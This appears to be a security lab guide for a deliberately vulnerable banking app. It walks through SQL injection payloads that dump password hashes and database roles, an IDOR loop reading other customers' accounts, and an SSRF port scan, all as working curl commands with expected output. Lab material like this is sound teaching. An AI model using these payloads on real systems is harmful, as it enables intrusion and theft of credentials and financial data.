# 08 — Security Experiments & Research Scenarios

> All experiments target the **live application endpoints** running on VM1 (App Server).
> Login as `alice / alice1234` first to obtain a session cookie, then use the token for authenticated requests.
> Navigate to **System Diagnostics** in the sidebar to access all 4 CTF tools in the browser.

---

## Experiment 0: Obtain a Session Token

```bash
# Replace <VM1_IP> with the application server's IP
TOKEN=$(curl -s -c /tmp/borsa.jar -X POST http://<VM1_IP>/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice1234"}' | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('access_token',''))")

echo "Token: $TOKEN"
```

All subsequent requests use the cookie jar (`-b /tmp/borsa.jar`) or Bearer token header:
```bash
AUTH="-b /tmp/borsa.jar"
# Or: AUTH="-H 'Authorization: Bearer $TOKEN'"
```

---

## Scenario 1: SQL Injection (SQLi) — CWE-89

### 1. Research Objective
Determine whether the user search endpoint uses unsafe string formatting, enabling an adversary to alter query structure and extract arbitrary records from `app_users`.

### 2. Vulnerable Endpoint
```
GET /api/auth/search?q=<input>
```

### 3. Execution Procedure

**Step 1 — Baseline (no injection):**
```bash
curl -s $AUTH "http://<VM1_IP>/api/auth/search?q=alice" | python3 -m json.tool
```
Expected: Returns 1 user record for `alice`.

**Step 2 — Boolean bypass (Vulnerable path):**
```bash
curl -s $AUTH "http://<VM1_IP>/api/auth/search?q=%27+OR+%271%27%3D%271" | python3 -m json.tool
# Decoded payload: ' OR '1'='1
```
Expected vulnerable outcome: All `app_users` records returned — authentication logic negated.

**Step 3 — UNION-based data extraction:**
```bash
curl -s $AUTH "http://<VM1_IP>/api/auth/search?q=alice%27+UNION+SELECT+username%2C+password_hash%2C+role+FROM+app_users+--" | python3 -m json.tool
# Decoded payload: alice' UNION SELECT username, password_hash, role FROM app_users --
```
Expected vulnerable outcome: `password_hash` column values for all users are returned in results.

**Step 4 — System catalog enumeration:**
```bash
curl -s $AUTH "http://<VM1_IP>/api/auth/search?q=%27+UNION+SELECT+rolname%2C+rolsuper::text%2C+rolcanlogin::text+FROM+pg_roles+--" | python3 -m json.tool
```

### 4. Observed Outcome
| Payload | Expected Result |
|---|---|
| `alice` | 1 record returned |
| `' OR '1'='1` | All users returned |
| UNION SELECT from `app_users` | Hashed passwords exposed |
| UNION SELECT from `pg_roles` | Database roles listed |

---

## Scenario 2: Excessive Database Privileges — CWE-250

### 1. Research Objective
Demonstrate the information leakage when the application role has access to system metadata beyond what it needs for normal business operations.

### 2. Vulnerable Endpoint
```
GET /api/transactions/export
```

### 3. Execution Procedure

**Step 1 — Export transactions and inspect session metadata:**
```bash
curl -s $AUTH "http://<VM1_IP>/api/transactions/export?limit=1" | python3 -m json.tool
```
Expected vulnerable outcome: Response includes a `session_metadata` field disclosing:
- `current_user` — the database role name used by the application
- `session_user` — authenticated session identity
- `pg_backend_pid` — backend process ID
- `version` — PostgreSQL version string

**Step 2 — Use disclosed DB role to probe further via SQLi:**
Once you know the DB role name from `session_metadata`, combine with Scenario 1 (SQLi) to query `information_schema.table_privileges`:
```bash
ROLE=$(curl -s $AUTH "http://<VM1_IP>/api/transactions/export?limit=1" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['session_metadata']['current_user'])")
echo "DB Role: $ROLE"

# Probe what this role can access
curl -s $AUTH "http://<VM1_IP>/api/auth/search?q=x%27+UNION+SELECT+privilege_type%2Ctable_name%2Cgrantee+FROM+information_schema.role_table_grants+WHERE+grantee%3D%27${ROLE}%27+--" | python3 -m json.tool
```

### 4. Observed Outcome
| Check | Expected Result |
|---|---|
| `session_metadata` present | DB role, PID, version exposed in API response |
| Privilege probe via SQLi chain | Full list of tables the DB role can access |

---

## Scenario 3: Broken Object-Level Authorization (BOLA / IDOR) — CWE-284

### 1. Research Objective
Evaluate whether Customer A (logged in as `alice`) can read Customer B's financial account balances and details by manipulating the account reference ID, bypassing application-level ownership enforcement.

### 2. Vulnerable Endpoint
```
GET /api/accounts/lookup/{account_ref}
```

### 3. Execution Procedure

**Step 1 — Identify own accounts:**
```bash
curl -s $AUTH "http://<VM1_IP>/api/accounts" | python3 -m json.tool
# Note alice's account IDs (should be 1, 2)
```

**Step 2 — Access other users' accounts (IDOR):**
```bash
# Try account IDs not owned by alice (assigned to bob, charlie, diana)
for ID in 1 2 3 4 5; do
  echo "=== Account $ID ==="
  curl -s $AUTH "http://<VM1_IP>/api/accounts/lookup/$ID" | python3 -m json.tool
done
```
Expected vulnerable outcome: All 5 accounts returned including those belonging to other customers — no ownership check enforced.

**Step 3 — Compare with the proper ownership-enforced endpoint:**
```bash
# /api/accounts/{id} enforces ownership (should 403 for accounts not owned by alice)
curl -s $AUTH "http://<VM1_IP>/api/accounts/3" | python3 -m json.tool
```
Expected secure outcome: `403 Forbidden` for account 3 (owned by bob).

### 4. Observed Outcome
| Endpoint | Account 1 (alice) | Account 3 (bob) |
|---|---|---|
| `GET /api/accounts/lookup/N` | ✅ Returns data | ✅ Returns data (VULNERABILITY) |
| `GET /api/accounts/N` | ✅ Returns data | ❌ 403 Forbidden (secure) |

---

## Scenario 4: Database Network Exposure / SSRF — CWE-668

### 1. Research Objective
Assess whether the database connectivity tool accepts arbitrary host/port inputs without restriction, enabling an adversary to map internal services and reach VM2 (DB server) through the application layer.

### 2. Vulnerable Endpoint
```
GET /api/diagnostics/db-ping?host=<host>&port=<port>
```

### 3. Execution Procedure

**Step 1 — Probe the database server directly (bypassing firewall):**
```bash
# Replace 192.168.56.102 with VM2's actual IP
curl -s $AUTH "http://<VM1_IP>/api/diagnostics/db-ping?host=192.168.56.102&port=5432" | python3 -m json.tool
```
Expected outcome: TCP connection state disclosed (`open` / `closed` / `timeout`).

**Step 2 — Internal port scan via SSRF:**
```bash
# Scan key ports on the DB server from the app server's network perspective
for PORT in 22 80 443 5432 8080 8443; do
  RESULT=$(curl -s $AUTH "http://<VM1_IP>/api/diagnostics/db-ping?host=192.168.56.102&port=$PORT" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('status','unknown'))" 2>/dev/null)
  echo "Port $PORT: $RESULT"
done
```

**Step 3 — Probe localhost services on VM1 itself:**
```bash
for PORT in 22 80 8000 3306 6379; do
  RESULT=$(curl -s $AUTH "http://<VM1_IP>/api/diagnostics/db-ping?host=127.0.0.1&port=$PORT" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('status','unknown'))" 2>/dev/null)
  echo "localhost:$PORT: $RESULT"
done
```

### 4. Observed Outcome
| Target | Expected Result |
|---|---|
| DB server port 5432 | `open` — confirms DB is reachable from app server |
| DB server port 22 | Reveals whether SSH is running on VM2 |
| localhost port 8000 | `open` — confirms Uvicorn backend is running internally |
| Unreachable host | `timeout` — confirms network-level isolation is working |
